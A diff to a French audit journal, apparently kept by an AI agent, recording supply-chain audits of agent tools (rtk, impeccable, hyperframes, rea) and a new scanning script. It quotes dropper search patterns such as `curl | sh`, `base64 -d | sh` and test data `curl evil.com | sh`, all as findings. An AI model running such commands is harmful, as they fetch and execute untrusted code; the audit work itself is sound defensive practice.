@@ -227,6 +227,158 @@ README (titre et puce), `SETUP.md` (étapes 2 et 4), les deux `QUICKSTART`, les 
 `CHEATSHEET` (nouvelle section 8, les suivantes renumérotées) et `ATTRIBUTION.md`.
 39 contrôles, 0 échec.
 
+## 2026-10-11 — Audit : `rtk` ajouté en `manual`, `impeccable` et `hyperframes` écartés
+
+Candidats tirés des dix étoiles ajoutées par l'humain entre le 2026-10-05 et le 2026-10-11, triés
+sur leur fiche GitHub ; trois audités à la demande. Méthode : clone au commit noté, lecture des
+manifestes, des hooks et du code exécutable qu'une installation lance, domaines sortants et motifs
+`curl | sh`, `irm | iex`, `base64 -d | sh`, `eval` sur réponse réseau. Skillspector **non lancé** :
+sur des dépôts de cette taille (8 à 105 Mo) il a plafonné à 0 % de couverture le 2026-10-04, la
+lecture manuelle porte seule l'audit. Tri des recoupements de descriptions par Laya
+(`laya_predict_batch`, `noul`, `min_confidence=0.75`), Jev en second avis sur les seuls cas sous
+le seuil, l'humain si les deux le sont — conformément aux règles de l'humain.
+
+**Ajouté : `rtk`** (`tool`, `manual`, `a4cddfc`, Apache-2.0, Patrick Szymkowiak) — un binaire Rust
+qui se place devant les commandes shell et en réduit la sortie avant que l'agent la lise.
+- Son `install.sh` télécharge la **dernière** release, avec vérification de somme de contrôle qui
+  refuse en cas d'échec (sauf `RTK_SKIP_CHECKSUM=1`). Ce n'est pas l'état inspecté : `SETUP.md`
+  documente donc `cargo install --git … --rev a4cddfc`, qui compile le commit audité (Rust 1.91+).
+- Télémétrie : URL compilée seulement dans les builds de release, **consentement explicite exigé**
+  avant tout envoi (commentaire « RGPD » dans `src/core/telemetry.rs`), `RTK_TELEMETRY_DISABLED=1`
+  pour la couper. Seule crate réseau : `ureq`, appelée uniquement par la télémétrie.
+- `rtk init -g` est **global** : `~/.claude/RTK.md`, `@RTK.md` ajouté à `~/.claude/CLAUDE.md`, et un
+  hook dans les réglages utilisateur qui réécrit toutes les commandes shell de tous les projets.
+  `rtk init` sans `-g` n'installe aucun hook (lu dans `src/hooks/init/claude.rs`,
+  `run_default_mode`) : un bloc dans le `CLAUDE.md` du projet et un modèle de filtres. Les deux
+  acceptent `--dry-run` et `--uninstall`. D'où `manual` : l'humain l'installe, jamais l'agent, et
+  jamais à la racine du workspace.
+- Motifs de dropper : l'installeur documenté du projet, depuis son propre dépôt ; une chaîne
+  `curl evil.com | sh` dans un test de `src/hooks/integrity.rs`. Rien d'autre.
+- Les 12 `SKILL.md` de son `.claude/skills/` servent au développement de `rtk` lui-même : comptés
+  dans le total, jamais liés.
+
+**Écartés, décision de l'humain sur ces constats :**
+- `impeccable` (`c63b8dd`, Apache-2.0) — une skill de qualité, mais ce qui tourne est un binaire
+  précompilé (`engine-v0.1.14`) téléchargé depuis les releases du projet (somme vérifiée, refus en
+  cas d'échec), pas la source inspectée ; installé par sa marketplace, ses hooks le lancent à chaque
+  `Edit`/`Write` et à chaque fin de tour. Et il entre en concurrence avec le socle par défaut :
+  Jev retient une concurrence avec `taste-skill` (0,82) et `redesign-skill` (0,84) après abstention
+  de Laya ; `soft-skill` resté indécis des deux côtés (Laya 0,60, Jev 0,45). Laya écarte, au-dessus
+  du seuil, une concurrence avec `make-interfaces-feel-better` (0,83), `design-system` (0,79) et
+  `accessibility` (0,82) — retenu selon la règle, contre la lecture de l'agent, qui voyait un
+  recoupement : un cas à garder pour calibrer le seuil. Les domaines publicitaires trouvés dans son
+  code (`googletagmanager`, `connect.facebook.net`) sont des données de test du code Rust.
+- `hyperframes` (`d4dd6c0`, Apache-2.0, HeyGen) — ses skills lancent `npx hyperframes` (156 fois,
+  dont 2 fois `@latest`) : le code exécuté est toujours la dernière version npm, l'épinglage n'y
+  protège rien. Télémétrie PostHog **active par défaut** (`HYPERFRAMES_NO_TELEMETRY=1` ou
+  `DO_NOT_TRACK=1` pour la couper). 21 skills, environ 2 700 tokens de descriptions par session.
+  Recoupements indécis des deux côtés : avec `ui-demo` (Laya 0,74, Jev 0,62) et `slideshow` avec
+  `pptx` (Laya 0,72, Jev 0,59) ; `motion-graphics` sans concurrence avec `motion-foundations`
+  (Laya 0,88). Hors du `stock`, réservé aux briques d'IA. Note : son arborescence dépasse la limite
+  de 260 caractères des chemins Windows dans un dossier profond ; `core.longpaths` était nécessaire.
+
+**Chiffres** : 26 lignes au catalogue ; fichiers `SKILL.md` aux commits épinglés, même méthode
+(`git ls-tree`, nom exact) : 2927 + 12 = **2939**. 39 contrôles, 0 échec.
+
+## 2026-10-11 — `scripts/scan.py`, et correction de la lecture du « 0 % »
+
+**Correction des entrées du 2026-10-04 et du 2026-10-11 (ci-dessus).** Elles disent que
+Skillspector a « plafonné à 0 % de couverture » et l'interprètent comme « presque rien
+inspecté ». C'est faux. Relu dans les rapports : sur `claude-quickstarts`, 623 fichiers
+*partiellement* inspectés, aucun ignoré ; la cause est **7 fichiers** — quatre fichiers de
+verrouillage lus comme « obfusqués », deux `requirements.txt` au-delà du plafond de 5 s de
+l'analyse des dépendances, un `docker-compose.yml` au plafond de sortie — qui dégradent des
+analyseurs entiers, d'où chaque fichier compté partiel. Sur `cloudflare/computer`, l'erreur était
+la nôtre : `--recursive` ne cherche un `SKILL.md` qu'un niveau plus bas, et ce dépôt n'en a pas à
+ce niveau ; il n'a quasiment rien scanné. Seul OfficeCLI butait sur une vraie limite de taille
+(920 binaires et archives, 294 fichiers non inspectés). Les décisions de ces entrées tiennent :
+aucune ne reposait sur la couverture de Skillspector.
+
+**Ajout : `scripts/scan.py`**, bibliothèque standard seulement, sans modification de
+Skillspector. Il découpe un dépôt en une unité par dossier de skill plus une pour les
+exécutables et manifestes hors skills, écarte fichiers de verrouillage, binaires et fichiers de
+plus de 1 Mo en listant chacun, copie chaque unité sous un chemin court (limite Windows de
+260 caractères), lance `skillspector scan --no-llm` et fusionne les rapports sur les chemins du
+dépôt, triés pour la lecture. Il ne tranche rien et sort toujours en 0. Laya n'y est pas branché :
+décision de l'humain, sur le constat qu'un tri automatique ne doit jamais pouvoir écarter un
+résultat. **Un appel réseau subsiste** : l'analyse des dépendances de Skillspector envoie les noms
+et versions de paquets à `api.osv.dev` (`nodes/analyzers/osv_client.py`), même en `--no-llm` ;
+aucun contenu de fichier. Gardé, car c'est lui qui trouve les dépendances vulnérables.
+
+**Mesures :**
+- `claude-quickstarts` : 86 % inspectés entièrement (310 sur 361), contre 0 % le 2026-10-04. Pas
+  le même ensemble : le script ne remet que skills, exécutables et manifestes (361 fichiers), pas
+  la prose hors skills (623 auparavant).
+- `rtk` : 87 % (208 sur 239), 13 unités, rien d'écarté. Premier scan Skillspector de `rtk` ; il
+  n'avait pas été lancé à son ajout plus haut dans la journée.
+
+**`rtk`, lecture des résultats** : 279 HIGH, 279 MEDIUM, 5 LOW sur exécutables, 22 sur la prose
+ignorés. Les HIGH se concentrent là où l'outil analyse et réécrit des commandes
+(`src/hooks/hook_cmd.rs` 77, `src/hooks/permissions.rs` 44) et dans les tests : chaînes `rm -rf`,
+listes de variables secrètes à masquer, données de test (`hunter2`, `curl evil.com | sh`). Lu en
+particulier : **le hook ne contourne pas les permissions de Claude Code.**
+`process_claude_payload_from_decision` ne renvoie `permissionDecision: "allow"` que pour une règle
+d'autorisation que l'humain a lui-même configurée ; sinon la commande est réécrite sans décision
+et la demande de confirmation habituelle s'affiche ; une règle d'interdiction bloque la
+réécriture. Nuance : une règle `allow` pour `git status` couvre aussi `rtk git status`, qui
+l'enveloppe. Les « Supply Chain » sur `.claude/hooks/*.sh` visent des hooks de développement du
+dépôt de `rtk`, que `rtk init` n'installe pas : il installe `rtk hook claude`, le binaire lui-même.
+Aucun code malveillant.
+
+**`claude-quickstarts`, trouvé grâce aux manifestes désormais remis au scanner** : deux démos
+(`customer-support-agent`, `financial-data-analyst`) figent Next.js 14.2.5 et 14.2.15, chacun visé
+par 16 avis publiés selon OSV, dont une exécution de code à distance dans l'API d'optimisation
+d'images. Pas malveillant, mais hérité par quiconque bâtit dessus : précaution ajoutée aux deux
+README, section du `stock`.
+
+## 2026-10-12 — Audit : `rea` écarté pour l'instant
+
+Candidats tirés des 24 étoiles ajoutées par l'humain les 2026-10-09 et 2026-10-11, triés sur leur
+README. Seize sont des applications auto-hébergées (holm, laranode, cmms, worklenz…), hors
+périmètre : ni skills ni outils d'agent. Sept outils d'agent ont été lus, mais ne sont pas audités
+(ai-memory, context-mode, ai-factory, hindsight, colibri, RuView, tinyfish-cookbook). Un seul
+a été audité à la demande : `rea`.
+
+**Écarté : `rea`** (`morluto/rea`, MIT). C'est un serveur MCP de rétro-ingénierie (binaires,
+Electron, .NET, APK, sites web) qui s'appuie sur Ghidra, IDA ou Hopper, et qui installe en plus
+une skill, `reverse-engineer-anything`.
+- **Méthode.** Clone de `main` à `c22111e` (2026-10-12). `python scripts/scan.py`, avec
+  Skillspector 2.11.2 en `--no-llm`. Lecture du code de l'installeur et des appels réseau.
+  Lecture, sans exécution, du tarball npm `rea-agents@6.4.0` : son `gitHead` est `a56f7bb`, et
+  son sha512 a été vérifié contre le registre. Rien du projet n'a été exécuté.
+- **Scan.** 2567 fichiers en 4 unités. 1203 constats sur des exécutables ou des manifestes
+  (10 CRITICAL, 79 HIGH), lus un par un : faux positifs ou comportement documenté (`exec()` sur
+  des fichiers du paquet, un `curl | bash` en commentaire). Aucun code malveillant trouvé.
+  Deux limites : la couverture complète n'est que de 9 fichiers, par le mécanisme décrit dans
+  l'entrée précédente, et `api.osv.dev` n'a pas répondu, donc **les dépendances vulnérables n'ont
+  pas été vérifiées**.
+- **Ce qui a décidé :**
+  - **Le code exécuté n'est pas celui qu'on inspecte.** Le paquet npm contient du JavaScript
+    compilé et un binaire Windows précompilé, absents du dépôt. `main` a 259 commits d'avance
+    sur la release npm.
+  - **L'épinglage est contourné.** La skill demande `npx -y rea-agents@latest` quand le CLI
+    manque (`SKILL.md`, l. 34-35).
+  - **Le rythme rend tout épinglage caduc en quelques jours.** 1658 commits en 7 jours,
+    9 releases en 8 jours, dont 3 changements de version majeure. `SECURITY.md` ne corrige que la
+    dernière version.
+  - **`rea setup` est global.** Il écrit `mcpServers.rea` dans `~/.claude.json` et copie la
+    skill dans `~/.claude/skills/`. Il n'installe toutefois ni hook ni permission.
+  - **Le support Windows est faible.** Ghidra n'y est qu'expérimental et la capture de processus
+    y est indisponible. Les outils d'exécution de cibles et d'ADB n'ont d'autre garde-fou que
+    l'approbation de Claude Code (« This is not a sandbox »).
+- **Recoupements avec `Anthropic-Cybersecurity-Skills`.** Le tri a suivi la chaîne Laya, puis
+  Jev, puis l'agent, au seuil de 0,85. Laya s'est abstenu sur les 5 paires. Jev retient une
+  concurrence avec les skills jadx et binwalk (0,85). L'agent la retient pour Ghidra. Deux paires
+  restent indécises (JavaScript, dnSpy) et sont sans objet tant que `rea` est écarté.
+- **Pour une réouverture.** Épingler le commit de la release npm, pas `main`, et le scanner avec
+  OSV joignable. Enregistrer le serveur à la main, en portée projet et à version exacte
+  (`claude mcp add --scope local rea -- cmd /d /c npx -y rea-agents@<version> mcp`), jamais avec
+  `rea setup`. Ne pas lier la skill. Utilisable dès maintenant ponctuellement, hors catalogue,
+  aux mêmes conditions.
+
+**Chiffres** : inchangés. 26 lignes au catalogue, 2939 fichiers `SKILL.md`. Le clone
+`mes_depots/rea` est hors catalogue et n'entre dans aucun compte.
+
 ---
 
 ## Avant de modifier ce fichier
